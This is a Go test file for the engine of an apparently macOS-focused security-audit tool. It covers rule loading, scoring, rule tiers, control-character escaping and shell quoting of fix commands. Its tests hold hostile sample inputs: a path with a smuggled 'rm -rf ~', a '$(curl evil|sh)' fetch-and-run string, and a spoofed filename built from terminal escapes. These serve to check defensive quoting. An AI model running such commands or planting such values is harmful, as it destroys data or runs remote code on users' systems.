package engine_test

import (
	"strings"
	"testing"

	"github.com/The-Last-Devops/security-warden/internal/engine"
	"github.com/The-Last-Devops/security-warden/internal/fix"
	"github.com/The-Last-Devops/security-warden/internal/source"
	"github.com/The-Last-Devops/security-warden/rules"
)

func sourceNames() []string {
	var ns []string
	for _, c := range source.All() {
		ns = append(ns, c.Name)
	}
	return ns
}

// Every bundled rule must load and pass its own sample items. This is the
// check CI runs on every contributed rule.
func TestBundledRules(t *testing.T) {
	rs, err := engine.Load(rules.FS, sourceNames(), fix.CheckRemedy)
	if err != nil {
		t.Fatal(err)
	}
	if len(rs) == 0 {
		t.Fatal("no rules loaded")
	}
	for _, r := range rs {
		for i, tc := range r.Tests {
			got, err := r.Matches(tc.Item)
			if err != nil {
				t.Errorf("%s test %d: %v", r.File(), i+1, err)
				continue
			}
			if got != tc.Expect {
				t.Errorf("%s test %d (%s): got %v, want %v", r.File(), i+1, tc.Note, got, tc.Expect)
			}
		}
		// Placeholders must refer to fields the positive samples have.
		for _, tc := range r.Tests {
			if !tc.Expect {
				continue
			}
			for _, lang := range []string{"en", "vi"} {
				for _, s := range []string{r.Title.Get(lang), r.Explain.Get(lang), r.Fix.Get(lang)} {
					if out := engine.Render(s, tc.Item); containsPlaceholder(out) {
						t.Errorf("%s: unfilled placeholder in %q", r.File(), out)
					}
				}
			}
		}
	}
}

func containsPlaceholder(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] == '{' {
			for j := i + 1; j < len(s) && j < i+40; j++ {
				if s[j] == '}' {
					return true
				}
				c := s[j]
				if !(c == '_' || c >= 'a' && c <= 'z' || c >= '0' && c <= '9') {
					break
				}
			}
		}
	}
	return false
}

func TestScore(t *testing.T) {
	mk := func(id, sev string) *engine.Rule {
		return &engine.Rule{ID: id, Severity: sev, Source: "s", Platforms: []string{"macos"}, Tier: "stable"}
	}
	rs := []*engine.Rule{mk("a", "high"), mk("b", "medium"), mk("c", "low"), mk("d", "critical")}
	ran := map[string]bool{"s": true}
	// total weight 6+3+1+10 = 20; failing b (3) → 17/20 = 85
	got, gain := engine.Score(rs, []engine.Finding{{RuleID: "b", Severity: "medium"}, {RuleID: "b", Severity: "medium"}}, ran, "macos")
	if got != 85 || gain["b"] != 15 {
		t.Errorf("score=%d gain=%v, want 85 and b:15", got, gain)
	}
	// one high problem caps at 80
	if got, _ := engine.Score(rs, []engine.Finding{{RuleID: "a", Severity: "high"}}, ran, "macos"); got > 75 {
		t.Errorf("score with a high finding = %d", got)
	}
	// a failing critical keeps the score below 80 even when most passes
	got, _ = engine.Score(append(rs, mk("e", "high"), mk("f", "high"), mk("g", "high")), []engine.Finding{{RuleID: "d", Severity: "critical"}}, ran, "macos")
	if got > 25 {
		t.Errorf("score with a critical finding = %d", got)
	}
	if got, _ := engine.Score(rs, nil, ran, "macos"); got != 100 {
		t.Errorf("clean score = %d", got)
	}
}

func TestCleanEscapesControlCharacters(t *testing.T) {
	got := engine.Render("file {file}", engine.Item{"file": ".env.\r\x1b[2K\u202efdp.exe"})
	for _, bad := range []string{"\r", "\x1b", "\u202e"} {
		if strings.Contains(got, bad) {
			t.Errorf("control character %q reached the output: %q", bad, got)
		}
	}
}

func TestRenderFixNeutralisesBackticks(t *testing.T) {
	it := engine.Item{"path": "/tmp/a`rm -rf ~`b", "stop_cmd": "a` · `b", "plain": "/home/u/.aws/credentials"}
	// Inside a command a machine value is one quoted shell word.
	if got := engine.RenderFix("Run `ls {path}`", it); got != "Run `ls '/tmp/a'\\''rm -rf ~'\\''b'`" {
		t.Errorf("machine value in a command: %q", got)
	}
	// In prose it only loses its backticks.
	if got := engine.RenderFix("See {path}.", it); got != "See /tmp/a'rm -rf ~'b." {
		t.Errorf("machine value in text: %q", got)
	}
	if got := engine.RenderFix("`chmod 600 {plain}`", it); got != "`chmod 600 /home/u/.aws/credentials`" {
		t.Errorf("plain path should stay unquoted: %q", got)
	}
	if got := engine.RenderFix("`{stop_cmd}`", it); got != "`a` · `b`" {
		t.Errorf("trusted markup field changed: %q", got)
	}
}

func TestShellQuote(t *testing.T) {
	cases := map[string]string{
		"ssh/key.pem":      "ssh/key.pem",
		"ssh/my key/a.pem": "'ssh/my key/a.pem'",
		"$(curl evil|sh)":  "'$(curl evil|sh)'",
		"it's":             `'it'\''s'`,
		"":                 "''",
	}
	for in, want := range cases {
		if got := engine.ShellQuote(in); got != want {
			t.Errorf("ShellQuote(%q) = %q, want %q", in, got, want)
		}
	}
}

// Experimental rules run only when asked, carry their tier, and never
// count in the score; community rules run by default and are labeled.
func TestTiers(t *testing.T) {
	mk := func(id, tier string) *engine.Rule {
		r, err := engine.Parse(id+".yaml", []byte(`id: `+id+`
severity: high
tier: `+tier+`
platforms: [macos]
source: backup
match: "!item.configured"
title: {en: T, vi: T}
check: {en: C, vi: C}
explain: {en: E, vi: E}
fix: {en: F, vi: F}
tests:
  - {item: {configured: false}, expect: true}
  - {item: {configured: true}, expect: false}
`), sourceNames(), fix.CheckRemedy)
		if err != nil {
			t.Fatal(err)
		}
		return r
	}
	rs := []*engine.Rule{mk("a-stable", "stable"), mk("b-community", "community"), mk("c-experimental", "experimental")}
	items := map[string][]engine.Item{"backup": {{"configured": false}}}
	ids := func(fs []engine.Finding) (out []string) {
		for _, f := range fs {
			out = append(out, f.RuleID+":"+f.Tier)
		}
		return out
	}
	if got := strings.Join(ids(engine.Evaluate(rs, items, "macos", "en")), " "); got != "a-stable: b-community:community" {
		t.Errorf("default = %s", got)
	}
	all := engine.EvaluateWith(rs, items, "macos", "en", true)
	if got := strings.Join(ids(all), " "); got != "a-stable: b-community:community c-experimental:experimental" {
		t.Errorf("experimental = %s", got)
	}
	ran := map[string]bool{"backup": true}
	if n, _ := engine.CoverageWith(rs, nil, ran, "macos", true); n != 3 {
		t.Errorf("checked with experimental = %d", n)
	}
	if n, _ := engine.Coverage(rs, nil, ran, "macos"); n != 2 {
		t.Errorf("checked = %d", n)
	}
	// Only the experimental rule failing: the score does not move.
	if s, gain := engine.Score(rs, all[2:], ran, "macos"); s != 100 || gain["c-experimental"] != 0 {
		t.Errorf("experimental finding scored: %d %v", s, gain)
	}
}
